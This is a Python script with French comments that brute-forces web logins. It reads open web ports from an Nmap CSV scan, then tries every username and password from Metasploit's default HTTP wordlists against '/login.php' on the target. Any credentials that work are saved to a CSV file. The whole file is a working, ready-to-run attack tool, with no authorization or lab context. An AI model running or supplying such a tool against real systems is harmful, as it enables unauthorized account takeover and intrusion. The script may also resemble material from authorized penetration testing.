import csv
import requests
from requests.auth import HTTPBasicAuth
import sys

# Chemins vers les fichiers de noms d'utilisateur et de mots de passe
usernames_file = '/usr/share/metasploit-framework/data/wordlists/http_default_users.txt'
passwords_file = '/usr/share/metasploit-framework/data/wordlists/http_default_pass.txt'

# Lire les utilisateurs à partir du fichier
def load_usernames(file_path):
    with open(file_path, 'r') as f:
        return [line.strip() for line in f.readlines()]

# Lire les mots de passe à partir du fichier
def load_passwords(file_path):
    with open(file_path, 'r') as f:
        return [line.strip() for line in f.readlines()]

# Fonction principale de brute force
def brute_force_login(target_url, usernames, passwords):
    successful_attempts = []
    for username in usernames:
        for password in passwords:
            response = requests.post(target_url, auth=HTTPBasicAuth(username, password))
            status = "Succès" if "Login failed" not in response.text and response.status_code == 200 else "Échec"
            print(f"Essai de {username}:{password} => Statut: {status}")
            if status == "Succès":
                successful_attempts.append((username, password, status))
                return successful_attempts
    return successful_attempts

# Charger les utilisateurs et mots de passe
usernames = load_usernames(usernames_file)
passwords = load_passwords(passwords_file)

# Fonction pour vérifier les ports web dans le fichier CSV de scan Nmap
def check_for_web_ports(csv_file, target):
    web_ports = []
    with open(csv_file, 'r') as file:
        reader = csv.DictReader(file)
        for row in reader:
            port = row.get('Port')
            if port == '80' or port == '443':
                protocol = 'https' if port == '443' else 'http'
                web_ports.append(f"{protocol}://{target}:{port}")
    return web_ports

# Enregistrement des résultats dans un fichier CSV
def save_results_to_csv(results, output_csv_file):
    if results:
        with open(output_csv_file, 'w', newline='') as csvfile:
            fieldnames = ['Username', 'Password', 'Status']
            writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
            writer.writeheader()
            for username, password, status in results:
                writer.writerow({'Username': username, 'Password': password, 'Status': status})
        print(f"Les résultats du brute force ont été enregistrés dans {output_csv_file}")
    else:
        with open(output_csv_file, 'w', newline='') as csvfile:
            writer = csv.writer(csvfile)
            writer.writerow(["Résultat"])
            writer.writerow(["Échec du brute force"])
        print(f"Aucun succès de brute force. Enregistré comme 'Échec du brute force' dans {output_csv_file}")

# Script principal
def main():
    if len(sys.argv) != 2:
        print("Usage: python3 brute_force.py <target>")
        sys.exit(1)

    target = sys.argv[1]
    nmap_csv_file = f"nmap_scan_{target.replace('/', '_').replace(':', '_')}.csv"
    output_csv_file = f"brute_force_results_{target.replace('/', '_').replace(':', '_')}.csv"

    web_ports = check_for_web_ports(nmap_csv_file, target)

    if not web_ports:
        print("Aucun port web trouvé pour bruteforce.")
        return

    login_page = '/login.php'  # Adapter en fonction de la page de connexion réelle
    for web_port in web_ports:
        full_url = f"{web_port}{login_page}"
        print(f"Essai de brute force sur {full_url}...")
        successful_attempts = brute_force_login(full_url, usernames, passwords)
        save_results_to_csv(successful_attempts, output_csv_file)
        if successful_attempts:
            print(f"Identifiants trouvés: {successful_attempts[0][0]}:{successful_attempts[0][1]}")
            break
    else:
        print("Aucun identifiant valide trouvé.")

if __name__ == "__main__":
    main()
